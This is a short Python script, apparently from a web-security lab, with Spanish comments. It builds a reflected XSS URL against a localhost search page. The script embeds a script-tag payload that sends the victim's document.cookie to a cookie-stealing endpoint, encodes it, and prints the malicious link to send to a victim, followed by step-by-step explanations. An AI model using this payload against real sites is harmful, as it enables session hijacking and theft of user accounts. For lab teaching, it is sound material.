import urllib.parse

base_url = "http://localhost/lab_xss/search.php"

attacker_server_url = "http://localhost/lab_xss/steal_cookie.php"
payload = f"<script>window.location.href='{attacker_server_url}?cookie=' + document.cookie;</script>"

encoded_payload = urllib.parse.quote_plus(payload)

malicious_url = f"{base_url}?query={encoded_payload}"

print("--- Explicación del Ataque XSS Reflejado ---")
print("1. El atacante crea un payload JavaScript para robar la cookie de la víctima.")
print("2. Codifica el payload para insertarlo en un parámetro de URL.")
print("3. Construye una URL completa y la envía a la víctima.")
print("\nURL Maliciosa Generada (envía esto a la víctima):")
print(malicious_url)
print("\n¿Qué pasa si la víctima hace clic?")
print(f"1. El navegador de la víctima va a: {base_url}")
print(f"2. El servidor busca el término: {encoded_payload}")
print("3. El servidor 'refleja' este término en la página HTML, sin codificarlo.")
print("4. El navegador de la víctima recibe el HTML y ejecuta el script <script>...</script>")
print("5. El script roba la cookie y la envía al servidor del atacante.")
print("6. La víctima es redirigida a la página principal, sin notar nada extraño.")
